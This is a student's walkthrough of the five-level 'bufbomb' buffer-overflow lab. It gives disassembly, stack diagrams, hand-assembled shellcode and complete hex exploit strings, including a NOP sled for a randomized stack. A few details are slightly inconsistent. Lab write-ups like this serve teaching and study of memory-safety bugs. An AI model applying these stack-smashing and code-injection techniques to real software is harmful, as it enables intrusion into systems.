# User ID and Cookie
This lab has totally 5 levels to solve, you have to use buff overflow to change runtime behavior of an executable file
`bufbomb`.  You also have to provide an User ID to run `bufbomb` and your answer will base on it. The Use ID and Cookie I am using:  
- User ID : Cthesky
- Cookie : 0x44fa5d89

# getbuf
Since level 0 ~ 3 are all related to `getbuf`, let's have a look at it:  
```asm
080491f4 <getbuf>:
 80491f4:	55                      push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret
```
We can see that buff starts at an address 40 smaller than saved $ebp, and ret address is just above saved $ebp :  

Address | Content
---     | ---
...     | ...
x + 44  | ret address
x + 40  | saved $ebp
...     | ...
x       | start of buff
...     | ...


# Level 0 : Smoke
Our task is to get `BUFBOMB` to execute the code for `smoke` when `getbuf` executes its return statement,
we could cause a buffer overflow and rewrite return address to address of `smoke`, which is 0x8048c18. The answer will be:  
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 18 8c 04 08
```

# Level 1 : Fizz
Similar to Level 0,  our task is to get `BUFBOMB` to execute the code for `fizz` rather  than returning  to
`test`. In this case, however, we must make it appear to`fizz` as if you have passed your cookie as its
argument.  
Similar to Level 0, we rewrite return address to address of 'fizz', which is 0x8048c42.
But before we put the argument on above retutn address, we have to insert an extra byte (content doesn't matter).  

Address | Content
---     | ---
...     | ...
x + 52  | cookie
x + 48  | whatever
x + 44  | ret address
x + 40  | saved $ebp
...     | ...
x       | start of buff
...     | ...

The reason is that actually we don't call `fizz`, we just make execution jump to fizz and no return address is pushed on stack, 
but `fizz` doesn't know that, it will assume there is a return address and search for arguments above it. So the answer will be:  
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 42 8c 04 08
00 00 00 00 89 5d fa 44
```

# Level 2 : Bang
Within the file `bufbomb` there is a function `bang` having the following C code:  
```c
int global_value = 0;

void bang(int val)
{
  if (global_value == cookie) {
    printf("Bang!: You set global_value to 0x%x\n", global_value);
    validate(2);
  } else
    printf("Misfire: global_value = 0x%x\n", global_value);
  exit(0);
}
```
Similar to Levels 0 and 1, our task is to get `BUFBOMB` to execute the code for `bang` rather than returning
to test. Before this, however, we must set global variable`global_value` to userid’s cookie.
So our exploit code should set `global_value`, push the address of `bang` on the stack, and then execute a `ret`
instruction to cause a jump to the code for `bang`, it looks like:
```asm
# global_value locates at 0x804d100
movl $0x44fa5d89, 0x804d100
push $0x8048c9d
ret
```
To get byte encoding of above instructions, assemble this file with `gcc -m32 -c` and disassemble it with
`objdump -d`:
```asm
   0:	c7 05 00 d1 04 08 89 	movl   $0x44fa5d89,0x804d100
   7:	5d fa 44 
   a:	68 9d 8c 04 08       	push   $0x8048c9d
   f:	c3                   	ret  
```
So the answer will be:  
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 c7 05 00 d1
04 08 89 5d fa 44 68 9d
8c 04 08 c3 74 39 68 55
```

# Level 3 : Boom
Our job for this level is to supply an exploit string that will cause `getbuf` to return cookie back to`test`
, rather than the value 1, which will cause the program to go “Boom!.”  
Our exploit code should set cookie as the return value, restore any corrupted state, push
the correct return location on the stack, and execute a ret instruction to really return to `test`, it looks like:  
```asm
movl $0x44fa5d89, %eax
push $0x8048dbe
ret
```  
Byte encodeing: 
```asm
   0:	b8 89 5d fa 44       	mov    $0x44fa5d89,%eax
   5:	68 be 8d 04 08       	push   $0x8048dbe
   a:	c3                   	ret  
```
Preceding steps are similar to Level 2, but there is one more thing : restore any corrupted state.   
To achieve that, we rewrite saved ebp with the original value 0x556839b0, so the answer will be:  
```
b8 89 5d fa 44 68 be 8d
04 08 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b0 39 68 55 58 39 68 55
```

# Level 4 : Nitroglycerin
For this Level, we have to run `BUFBOMB` with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling
the function `getbuf`, the program calls a slightly different function`getbufn`:  
```c
/* Buffer size for getbufn */
#define KABOOM_BUFFER_SIZE 512
```  
This function is similar to `getbuf`, except that it has a buffer of 512 characters.  You will need this additional
space to create a reliable exploit.  The code that calls `getbufn` first allocates a random amount
of storage on the stack,  such that if you sample the value of %ebp
during  two successive  executions  of getbufn, you would find they differ by as much as ± 240.  
In addition,  when run in Nitro mode, `BUFBOMB` requires  you to supply  your  string  5 times,  and it will
execute `getbufn` 5 times, each with a different stack offset.  Our exploit string must make it return cookie 
each of these times.  
  
Our task is identical to the task for the Dynamite level.  Once again, our job for this level is to supply an
exploit string that will cause `getbufn` to return your cookie back to test, rather than the value 1.  
    
This time we are unable to rewrite saved $ebp with a fixed value because it changes every time, but `testn's $ebp - getbufn's $ebp`
will remain same, which is 0x30 (using gdb). When `getbuf` execute 'ret',
$ebp has been already corrupted by poping a bad value from stack,
but $esp holds the value 8 bytes bigger than saved $ebp, so we can compute saves $ebp by $esp + 0x28,
so our exploit code looks like:  
```asm
lea 0x28(%esp), %ebp
movl $0x44fa5d89, %eax
push $0x8048e3a
ret
```  
Byte encodeing:  
```asm
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 89 5d fa 44       	mov    $0x44fa5d89,%eax
   9:	68 3a 8e 04 08       	push   $0x8048e3a
   e:	c3                   	ret   
```  
Now consider how to deal with randomized stack address, we use "nop sleds" and make sure every time the return address we give
leads to our "sled". First take a look at those addresses, use gdb to print address of buff: 

| Address    |
| ---        |
| 0x55683768 |
| 0x55683778 |
| 0x556837a8 |
| 0x556837b8 |
| 0x556837d8 |

Even I try it many times, I alwasy get these 5 addresses. 
So I assume 0x556837a0 is the average address (avg of 0x55683768 0x556837d8), I will set return address as 0x556838a0 + 250 
and fill starring 500 bytes wieh 0x90 (nop). Since address differs only ± 240, it will always leads to "sled". So the answer wil be:
```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 8d 6c 24 28 b8 89 5d fa 44 68 3a 8e
04 08 c3 00 00 00 00 00 00 3a 68 55 9a 38 68 55
```
